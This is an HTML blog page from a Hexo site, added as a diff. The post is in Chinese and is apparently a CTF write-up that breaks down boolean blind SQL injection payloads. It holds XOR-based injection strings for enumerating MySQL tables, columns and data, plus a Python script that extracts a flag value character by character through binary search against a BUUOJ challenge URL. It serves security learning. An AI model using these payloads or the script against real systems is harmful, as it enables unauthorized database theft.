@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="布尔盲注payload拆解分析重点函数ord() 转换成ASCII码 mid(string，n，1) AND substr(string，n，1) 截取字符串第n位 left(sting，n) 截取字符串的前n位 示例异或 12345678[&#96;查表&#96;]1^(ord(substr((select(group_concat(table_name))from(information_schema.tab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2022/03/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="布尔盲注payload拆解分析重点函数ord() 转换成ASCII码 mid(string，n，1) AND substr(string，n，1) 截取字符串第n位 left(sting，n) 截取字符串的前n位 示例异或 12345678[&#96;查表&#96;]1^(ord(substr((select(group_concat(table_name))from(information_schema.tab">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-14T14:42:45.876Z">
+<meta property="article:modified_time" content="2022-03-13T14:48:57.172Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-布尔盲注payload拆解分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2022-03-14T14:42:45.876Z" itemprop="datePublished">2022-03-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="布尔盲注payload拆解分析"><a href="#布尔盲注payload拆解分析" class="headerlink" title="布尔盲注payload拆解分析"></a>布尔盲注payload拆解分析</h1><h3 id="重点函数"><a href="#重点函数" class="headerlink" title="重点函数"></a>重点函数</h3><p><code>ord()</code> 转换成ASCII码</p>
+<p><code>mid(string，n，1)</code> AND <code>substr(string，n，1)</code> 截取字符串第n位</p>
+<p><code>left(sting，n)</code> 截取字符串的前n位</p>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>异或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[`查表`]</span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())), 1,1))&gt;0)^1</span><br><span class="line"></span><br><span class="line">[`查列`]</span><br><span class="line">1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)), 1,1))&gt;0)^1`</span><br><span class="line"></span><br><span class="line">[`查数据`]</span><br><span class="line">1^(ord(substr((select(group_concat(flag,value))from(flag)), 1,1))&gt;0)^1</span><br></pre></td></tr></table></figure>
+
+<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><p><code>group_concat()</code>  可以组合多个字符串</p>
+<p><code>information_schema.tables</code> 查表</p>
+<p><code>information_schema.columns</code> 查列</p>
+<p><code>substr(sql语句返回的值,n,1) </code> 截取字符串，查看数据库库名的第n位，字长为1</p>
+<p><code>ord</code> 函数返回[字符串]第一个字符的 ASCII码值。通过ASCII码确定数据库名【<code>ord(mid(查询语句))</code>】</p>
+<h3 id="语句分析"><a href="#语句分析" class="headerlink" title="语句分析"></a>语句分析</h3><p><code>table_name</code> 是表名</p>
+<p><code>table_schema</code> 是库名</p>
+<p><code>information_shcema</code>  可看作为数据库名，表明，数据类型，权限等这些的数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查表：select(group_concat(table_name))from(information_shcema.tables)where(table_schema=databases())</span><br><span class="line">返回ASCII码：ord(mid(SQL语句查询的表名))</span><br></pre></td></tr></table></figure>
+
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>&#96;&#96;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def payload(url, i, mid): # 猜解单个字段值</span><br><span class="line">    payload = &quot;1^(ord(substr((select(group_concat(value))from(flag)), %d,1))&gt;=%s)^1&quot;%(i,mid)</span><br><span class="line">    payload_url = url + payload</span><br><span class="line">    # time.sleep(1)</span><br><span class="line">    print(payload)</span><br><span class="line">    resp = requests.get(payload_url)</span><br><span class="line">    # 如果能够执行下列语句 则代表着 大于或等于</span><br><span class="line">    if &quot;admin&quot; in resp.text:</span><br><span class="line">        # 再次进行判断</span><br><span class="line">        payload = &quot;1^(ord(substr((select(group_concat(value))from(flag)), %d,1))=%s)^1&quot;%(i,mid)</span><br><span class="line">        payload_url = url + payload</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        print(payload)</span><br><span class="line">        resp = requests.get(payload_url)</span><br><span class="line">        if &quot;admin&quot; in resp.text:</span><br><span class="line">        # 拿到目标数</span><br><span class="line">            return 200</span><br><span class="line">        else:</span><br><span class="line">            # 小于目标值</span><br><span class="line">            return 203</span><br><span class="line">    # 大于目标值</span><br><span class="line">    else:</span><br><span class="line">        return 400</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp(url):</span><br><span class="line">    column_value = &quot;&quot;</span><br><span class="line">    for i in range(1,300):</span><br><span class="line">        start = 33</span><br><span class="line">        end = 127</span><br><span class="line">        while start &lt;= end:</span><br><span class="line">            mid = (start + end) // 2</span><br><span class="line">            res = payload(url,i,mid)</span><br><span class="line">            print(&quot;[*] 返回码：&quot; + str(res))</span><br><span class="line">            # 代表找到</span><br><span class="line">            if res == 200:</span><br><span class="line">                print(&quot;[+] mid = &quot;+str(mid))</span><br><span class="line">                column_value += chr(mid)</span><br><span class="line">                break</span><br><span class="line">            # 代表是小于字符ascii码值</span><br><span class="line">            elif res == 203:</span><br><span class="line">                start = mid + 1 </span><br><span class="line">            # 代表是大于 ascii码值</span><br><span class="line">            elif res == 400:</span><br><span class="line">                end = mid - 1</span><br><span class="line">        print(&quot;[+] &quot; + column_value)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    url = &quot;http://2881a64e-02bf-4c71-b948-26b1a1e6c0ae.node3.buuoj.cn/?stunum=&quot;</span><br><span class="line">    exp(url)</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/03/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/" data-id="cl0qtf6s300017kw56uty3xxf" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/03/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
